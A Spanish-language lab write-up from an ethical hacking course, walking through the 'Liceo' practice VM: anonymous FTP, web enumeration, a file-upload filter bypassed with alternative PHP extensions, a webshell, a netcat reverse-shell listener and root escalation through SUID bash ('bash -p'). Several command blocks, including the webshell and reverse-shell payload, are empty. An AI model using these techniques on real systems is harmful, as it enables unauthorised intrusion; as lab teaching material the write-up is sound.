---
title: "🖥️ Máquina: Liceo — Hacking Ético"
aliases:
  - Liceo
  - liceo
  - Máquina Liceo
  - VM Liceo
  - Writeup Liceo
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Liceo

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** FTP anónimo · Enumeración web · File Upload (bypass de extensión) · Webshell · Reverse Shell · Escalada de privilegios (SUID bash)  
> **Descripción:** En esta práctica accederemos al FTP anónimo para obtener una pista sobre un usuario, enumeraremos la web y descubriremos un formulario de subida de archivos con filtro de extensiones. Saltaremos el filtro probando extensiones alternativas a PHP, ejecutaremos comandos remotamente y obtendremos una reverse shell. La escalada de privilegios aprovecha el bit SUID en /usr/bin/bash.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.5`
* **`RHOST` (Víctima / Liceo):** Ej. `10.0.0.10`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Liceo tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos revisando los puertos:

```bash
nmap -sT -p- 10.0.0.10
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Y los servicios detrás de cada puerto:

```bash
nmap -A -p 21,22,80 10.0.0.10
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.0.5
|      Logged in as ftp
|      TYPE: ASCII
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Liceo
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Unix
```

> [!info] Resultado
> En el ftp hay habilitado un usuario anónimo, vamos a revisar qué hay dentro:

---

## 📁 Fase 2: FTP anónimo

```bash
ftp anonymous@10.0.0.10
```

```text
Password: ENTER
```

```bash
ls -la
```

```bash
more note.txt
```

```text
Hi Matias, I have left on the web the continuations of today's work, 
would you mind contiuing in your turn and make sure that the web will be secure? 
Above all, we dont't want intruders...
```

> [!info] Resultado
> Un posible usuario: Matias. La nota también indica que han dejado algo en la web.

```bash
exit
```

---

## 🌐 Fase 3: Reconocimiento web

Vamos ahora a revisar la web:

```bash
whatweb http://10.0.0.10
```

```text
http://10.0.0.10 [200 OK] Apache[2.4.52], Bootstrap, Email[liceoescuela@liceo.com],
HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[Liceo]
```

```bash
nikto -h http://10.0.0.10
```

```text
- Nikto v2.5.0
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1".
+ /css/: Directory indexing found.
+ /images/: Directory indexing found.
+ 8046 requests: 0 error(s) and 10 item(s) reported on remote host
```

> [!info] Resultado
> Alguna información y directorios descubiertos. Seguimos ahora enumerando con gobuster:

```bash
gobuster dir -r -u http://10.0.0.10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,htm,html
```

```text
/uploads  (Status: 200) [Size: 745]
/upload.php  (Status: 200) [Size: 371]
```

> [!info] Resultado
> Hay un directorio uploads y un php para posiblemente subir archivos a ese directorio.
> · En http://10.0.0.10/upload.php hay una web para subir archivos.
> · En http://10.0.0.10/uploads/ de momento está vacío.
> · De momento en el upload no deja subir php.

---

## 📤 Fase 4: File Upload — bypass de extensión

Empezamos subiendo algo sencillo, vamos a crear un txt y vemos si luego lo podemos leer:

```bash
echo "test" > test.txt
```

> [!info] Resultado
> Nos pone que el archivo txt lo sube correctamente. Vamos a tratar de leerlo:

```bash
curl http://10.0.0.10/uploads/test.txt
```

```text
test
```

> [!info] Resultado
> Tenemos acceso al archivo. Ahora vamos a crear un php sencillo con un parámetro dentro para ejecutar comandos:

```bash
echo '' > simple.php
```

> [!info] Resultado
> No deja subir archivos con extensión php. Vamos a probar con otras extensiones maliciosas similares a php que permitan ejecutar código.
> Ejemplo de extensiones alternativas:
> .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
> Vamos a crear un archivo de extensiones primero:

```bash
cat <<EOF > dic_ext.txt
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
EOF
```

Y lo vamos a usar para renombrar nuestro archivo y tenerlo con diferentes extensiones para luego irlo subiendo:

```bash
cat dic_ext.txt | while read line; do cp simple.php "simple$line" ;done
```

> [!info] Resultado
> Dará un error de que simple.php y simple.php son el mismo fichero, es normal, lo ignoramos. Ahora vamos subiendo a ver si alguno lo acepta. Uno que acepta por ejemplo es la extensión phtml.

---

## 🐚 Fase 5: Ejecución remota de comandos y Reverse Shell

Tratamos de ejecutar comandos con la webshell subida:

```bash
curl
```

```bash
curl
```

```text
/usr/bin/nc
```

```bash
curl
```

```text
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev:/home/dev:/bin/bash
```

Preparamos la conexión inversa. En otra terminal en kali la ponemos en escucha:

```bash
nc -lnvp 9002
```

```text
listening on [any] 9002 ...
```

> [!info] Resultado
> El envío de la conexión sólo funciona con url encode. Otra opción es generar un pentest monkey en revshells.com. En mi caso con esta línea se consigue la conexión inversa:

```bash

```

```text
listening on [any] 9002 ...
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.10] 55858
bash: cannot set terminal process group (700): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$
```

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
cd /home/dev
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
71ab613fa286844425523780a7ebbab2
```

> [!info] Resultado
> Flag de usuario obtenida: 71ab613fa286844425523780a7ebbab2

---

## 🚀 Fase 6: Escalada de privilegios — SUID en /usr/bin/bash

Ahora vamos a tratar de elevar privilegios. Buscando permisos SUID:

```bash
find / -type f -perm -4000 2>/dev/null
```

```text
/usr/bin/bash
```

> [!info] Resultado
> Buscando en GTFOBins vemos que para elevar privilegios sólo tenemos que ejecutarlo con el parámetro -p:

```bash
/usr/bin/bash -p
```

> [!info] Resultado
> Y ya tenemos el root:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
BF9A57023EDD8CFAB92B8EA516676B0D
```

> [!info] Resultado
> Flag de root obtenida: BF9A57023EDD8CFAB92B8EA516676B0D

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
